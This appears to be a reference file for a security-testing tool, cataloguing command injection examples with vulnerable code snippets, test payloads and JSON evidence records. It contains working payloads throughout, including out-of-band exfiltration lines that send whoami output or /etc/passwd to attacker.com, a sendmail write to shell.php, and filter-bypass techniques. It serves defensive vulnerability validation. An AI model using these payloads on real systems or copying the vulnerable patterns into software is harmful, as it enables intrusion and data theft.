# Command Injection Examples

This file contains command injection examples with evidence patterns for direct injection, blind time-based, blind out-of-band, argument injection, and platform-specific attacks.

## Table of Contents
1. [Direct Command Injection](#direct-command-injection)
2. [Blind Command Injection - Time-Based](#blind-command-injection---time-based)
3. [Blind Command Injection - Out-of-Band](#blind-command-injection---out-of-band)
4. [Argument Injection](#argument-injection)
5. [Context-Specific Injection](#context-specific-injection)
6. [Platform-Specific Examples](#platform-specific-examples)
7. [Test Result Types](#test-result-types)
8. [Common Payloads Reference](#common-payloads-reference)

---

## Direct Command Injection

### Example 1: Ping Utility Injection

**Scenario:** Web application provides ping functionality that passes user input directly to shell.

**Vulnerability:**
```python
# Python - VULNERABLE
import os
def ping_host(hostname):
    result = os.popen(f"ping -c 3 {hostname}").read()  # No sanitization!
    return result
```

**Test:**
1. Baseline: `GET /ping?host=127.0.0.1` → Normal ping output
2. Payload: `GET /ping?host=127.0.0.1;id`
3. Detection: Response contains `uid=` indicating command executed

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_direct",
  "cwe": "CWE-78",
  "platform": "linux",
  "test": {
    "url": "http://target.com/ping?host=127.0.0.1;id",
    "method": "GET",
    "status": 200,
    "response_snippet": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1...\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
    "response_hash": "sha256:abc..."
  },
  "evidence": "Direct command injection: 'id' command output returned",
  "payload_used": ";id"
}
```

---

### Example 2: File Converter Injection

**Scenario:** Document converter uses system commands for processing.

**Vulnerability:**
```php
// PHP - VULNERABLE
$filename = $_POST['filename'];
exec("convert $filename output.pdf");  // Shell injection via filename
```

**Test:**
1. Payload: `filename=test.png;whoami`
2. Detection: `www-data` or username in response

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_filename",
  "cwe": "CWE-78",
  "test": {
    "url": "http://target.com/convert",
    "method": "POST",
    "payload": "filename=test.png;whoami",
    "response_snippet": "www-data\nConversion complete"
  },
  "evidence": "Command injection via filename parameter",
  "payload_used": ";whoami"
}
```

---

### Example 3: Backtick Substitution

**Scenario:** Application filters semicolons but not backticks.

**Test:**
1. Payload: `host=127.0.0.1`id``
2. Detection: `uid=` in response

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_backtick",
  "cwe": "CWE-78",
  "test": {
    "payload": "127.0.0.1`id`",
    "response_snippet": "uid=33(www-data) gid=33(www-data)"
  },
  "evidence": "Command injection via backtick substitution (semicolon filter bypassed)",
  "payload_used": "`id`"
}
```

---

## Blind Command Injection - Time-Based

### Example 4: Sleep-Based Detection

**Scenario:** Command output not reflected, but execution can be confirmed via delay.

**Test:**
1. Baseline: `GET /lookup?domain=example.com` → 0.5s response
2. Payload: `GET /lookup?domain=example.com;sleep+5`
3. Detection: Response takes ~5.5s (baseline + 5s delay)

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_blind_time",
  "cwe": "CWE-78",
  "platform": "linux",
  "baseline": {
    "url": "http://target.com/lookup?domain=example.com",
    "response_time_ms": 523
  },
  "test": {
    "url": "http://target.com/lookup?domain=example.com;sleep+5",
    "response_time_ms": 5541,
    "delay_detected_ms": 5018
  },
  "evidence": "Blind command injection: 5.0s delay confirms sleep command execution",
  "payload_used": ";sleep 5"
}
```

---

### Example 5: Ping-Based Delay (Cross-Platform)

**Scenario:** Sleep not available; use ping for time-based detection.

**Test (Linux):**
```
; ping -c 5 127.0.0.1
```

**Test (Windows):**
```
| ping -n 5 127.0.0.1
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_blind_ping",
  "cwe": "CWE-78",
  "platform": "windows",
  "test": {
    "payload": "| ping -n 5 127.0.0.1",
    "baseline_time_ms": 450,
    "payload_time_ms": 4520,
    "delay_detected_ms": 4070
  },
  "evidence": "Blind command injection: ping delay (~4s for 5 packets)",
  "payload_used": "| ping -n 5 127.0.0.1"
}
```

---

## Blind Command Injection - Out-of-Band

### Example 6: DNS Callback

**Scenario:** No output, no timing difference, but DNS callbacks allowed.

**Test:**
1. Payload: `; nslookup unique-id.attacker.com`
2. Detection: DNS query received at attacker-controlled DNS server

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_oob_dns",
  "cwe": "CWE-78",
  "test": {
    "url": "http://target.com/export?format=pdf;nslookup+abc123.attacker.com",
    "method": "GET",
    "status": 200
  },
  "callback": {
    "type": "DNS",
    "received": true,
    "query": "abc123.attacker.com",
    "source_ip": "10.0.1.50",
    "timestamp": "2025-01-19T15:30:00Z"
  },
  "evidence": "OOB command injection: DNS callback received from target",
  "payload_used": "; nslookup abc123.attacker.com"
}
```

---

### Example 7: HTTP Callback with Data Exfiltration

**Scenario:** Exfiltrate command output via HTTP callback.

**Test:**
```
$(curl http://attacker.com/collect?data=$(whoami))
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_oob_http",
  "cwe": "CWE-78",
  "callback": {
    "type": "HTTP",
    "received": true,
    "request_path": "/collect?data=www-data",
    "source_ip": "10.0.1.50"
  },
  "evidence": "OOB command injection: HTTP callback with username exfiltrated",
  "payload_used": "$(curl http://attacker.com/collect?data=$(whoami))"
}
```

---

## Argument Injection

### Example 8: Argument Injection in Backup Tool

**Scenario:** Application uses rsync/tar with user-controlled arguments.

**Vulnerability:**
```python
# VULNERABLE
import subprocess
def backup(source, dest):
    subprocess.run(f"rsync {source} {dest}", shell=True)
```

**Test:**
1. Payload: `source=--help`
2. Detection: Help output reveals rsync options

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "argument_injection",
  "cwe": "CWE-88",
  "test": {
    "url": "http://target.com/backup?source=--help",
    "response_snippet": "rsync  version 3.2.3  protocol version 31\nUsage: rsync [OPTION]..."
  },
  "evidence": "Argument injection: --help revealed rsync command options",
  "payload_used": "--help"
}
```

---

### Example 9: Output Redirection via Arguments

**Scenario:** Inject output file argument.

**Test:**
1. Payload: `filename=test.txt --output=/tmp/pwned`
2. Detection: File created at specified path

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "argument_injection_output",
  "cwe": "CWE-88",
  "test": {
    "payload": "--output=/var/www/html/test.txt",
    "file_created": true
  },
  "evidence": "Argument injection: arbitrary file write via --output argument",
  "payload_used": "--output=/var/www/html/test.txt"
}
```

---

## Context-Specific Injection

### Example 10: Injection via User-Agent Header

**Scenario:** Application logs User-Agent via shell command.

**Vulnerability:**
```bash
# VULNERABLE logging script
echo "User visited: $USER_AGENT" >> /var/log/access.log
```

**Test:**
```
User-Agent: Mozilla/5.0; $(sleep 5)
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_header",
  "cwe": "CWE-78",
  "test": {
    "injection_point": "User-Agent header",
    "baseline_time_ms": 200,
    "payload_time_ms": 5250
  },
  "evidence": "Command injection via User-Agent header (time-based)",
  "payload_used": "$(sleep 5)"
}
```

---

### Example 11: Email Functionality Injection

**Scenario:** Application uses sendmail with user-controlled input.

**Vulnerability:**
```php
// VULNERABLE
mail($to, $subject, $message, "-f$from");  // $from is user-controlled
```

**Test:**
1. Payload: `from=-X/var/www/html/shell.php`
2. Detection: File created via sendmail's -X logging option

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_mail",
  "cwe": ["CWE-78", "CWE-88"],
  "test": {
    "injection_point": "email from field",
    "payload": "-X/var/www/html/shell.php"
  },
  "evidence": "Sendmail argument injection via -X flag (file write)",
  "payload_used": "-X/var/www/html/shell.php"
}
```

---

## Platform-Specific Examples

### Example 12: Windows Command Injection

**Test Payloads:**
```
& dir
| type C:\windows\win.ini
& timeout /t 5
| net user
& whoami /all
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_windows",
  "cwe": "CWE-78",
  "platform": "windows",
  "test": {
    "payload": "& dir",
    "response_snippet": "Volume in drive C has no label.\n Directory of C:\\inetpub\\wwwroot"
  },
  "evidence": "Windows command injection: directory listing returned",
  "payload_used": "& dir"
}
```

---

### Example 13: PowerShell Injection

**Scenario:** Windows application uses PowerShell.

**Test Payloads:**
```
; Get-Process
| Get-ChildItem
; Start-Sleep -Seconds 5
$(Get-Content C:\windows\win.ini)
```

**Evidence:**
```json
{
  "status": "VALIDATED",
  "injection_type": "command_injection_powershell",
  "cwe": "CWE-78",
  "platform": "windows_powershell",
  "test": {
    "payload": "; Start-Sleep -Seconds 5",
    "baseline_time_ms": 300,
    "payload_time_ms": 5350
  },
  "evidence": "PowerShell command injection: Start-Sleep delay confirmed",
  "payload_used": "; Start-Sleep -Seconds 5"
}
```

---

## Test Result Types

### FALSE_POSITIVE (Properly Secured)

**Scenario:** Application uses parameterized execution.

```json
{
  "status": "FALSE_POSITIVE",
  "injection_type": "command_injection",
  "test": {
    "payloads_tested": [";id", "|whoami", "`id`", "$(id)"],
    "response_behavior": "All metacharacters escaped or rejected"
  },
  "evidence": "Command injection mitigated: input properly sanitized"
}
```

### UNVALIDATED (WAF Blocking)

```json
{
  "status": "UNVALIDATED",
  "injection_type": "command_injection",
  "reason": "WAF blocking shell metacharacters",
  "test": {
    "status": 403,
    "response_snippet": "Request blocked: malicious input detected"
  },
  "evidence": "Cannot validate - WAF blocks injection attempts"
}
```

### PARTIAL (Some Metacharacters Blocked)

```json
{
  "status": "PARTIAL",
  "injection_type": "command_injection",
  "tests": {
    "semicolon": {"blocked": true},
    "pipe": {"blocked": true},
    "backtick": {"blocked": false, "result": "possible execution"},
    "dollar_paren": {"blocked": false, "result": "possible execution"}
  },
  "evidence": "Partial command injection: ; and | blocked, but ` and $() may work",
  "requires_manual_review": true
}
```

---

## Common Payloads Reference

### Command Separators (Unix/Linux)
```bash
; id                    # Semicolon separator
| id                    # Pipe
|| id                   # OR (if previous fails)
& id                    # Background
&& id                   # AND (if previous succeeds)
`id`                    # Backtick substitution
$(id)                   # Dollar-paren substitution
%0aid                   # Newline (URL encoded)
id                      # Newline (literal)
```

### Command Separators (Windows)
```cmd
& dir                   # Separator
| dir                   # Pipe
|| dir                  # OR
&& dir                  # AND
```

### Time-Based Payloads
```bash
# Unix/Linux
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& sleep 5 &
; ping -c 5 127.0.0.1

# Windows
& timeout /t 5
| ping -n 5 127.0.0.1
& ping -n 5 127.0.0.1 &
```

### Out-of-Band Payloads
```bash
# DNS
; nslookup attacker.com
$(nslookup attacker.com)
| nslookup attacker.com

# HTTP
; curl http://attacker.com/
; wget http://attacker.com/
$(curl http://attacker.com/?d=$(whoami))
| curl -d @/etc/passwd http://attacker.com/

# Windows DNS
& nslookup attacker.com
| nslookup attacker.com
```

### Information Gathering
```bash
# Unix/Linux
id
whoami
uname -a
cat /etc/passwd
hostname
ifconfig
pwd

# Windows
whoami
whoami /all
dir
type C:\windows\win.ini
ipconfig
hostname
```

### Filter Bypass Techniques
```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Quote bypass
w'h'o'am'i
w"h"o"am"i

# Slash bypass
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Encoding
$(echo d2hvYW1p | base64 -d)   # whoami in base64
```

---

## CWE Reference

| CWE | Name | DAST Testable |
|-----|------|---------------|
| CWE-78 | OS Command Injection | Yes |
| CWE-77 | Command Injection (generic) | Yes |
| CWE-88 | Argument Injection | Yes |
| CWE-74 | Injection (parent) | Yes |

**Related Attack Patterns:**
- CAPEC-88: OS Command Injection
- CAPEC-15: Command Delimiters
- CAPEC-6: Argument Injection
- CAPEC-108: Command Line Execution through SQL Injection
